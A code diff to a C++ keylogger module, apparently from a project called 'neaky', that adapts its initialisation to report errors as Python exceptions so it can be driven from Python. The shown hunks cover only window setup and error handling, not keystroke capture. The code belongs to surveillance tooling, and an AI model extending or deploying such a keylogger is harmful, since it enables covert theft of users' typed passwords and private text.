@@ -1,6 +1,5 @@
 #define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
 // Windows 头文件
-#define UNICODE
 #include <windows.h>
 #include <cstdio>
 #include <iostream>
@@ -8,6 +7,10 @@
 
 #include <neaky/utils.h>
 #include "keylog.h"
+
+#define PY_SSIZE_T_CLEAN
+#include <Python.h>
+#include "../neakymodule.h"
 
 extern "C" HINSTANCE hInst;
 
@@ -21,12 +24,13 @@ static HWND hWnd;
 static ATOM                MyRegisterClass(HINSTANCE hInstance);
 static LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
 
-static void KeyLoggerInit(std::ostream* os)
+static BOOL KeyLoggerInit(std::ostream* os)
 {
     ATOM res = MyRegisterClass(hInst);
     if (res == NULL)
     {
-        ErrorExit(L"register class");
+        PyErr_SetString(NeakyError, "RegisterClassExW failed.");
+        return FALSE;
     }
 
     hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
@@ -34,11 +38,13 @@ static void KeyLoggerInit(std::ostream* os)
     
     if (hWnd == NULL)
     {
-        ErrorExit(L"CreateWindowW Failed!");
+        PyErr_SetString(NeakyError, "CreateWindowW failed.");
+        return FALSE;
     }
     outStream = os;
     //ShowWindow(hWnd, SW_SHOWNORMAL);
     //UpdateWindow(hWnd);
+    return TRUE;
 }
 
 static void KeyLoggerFini()
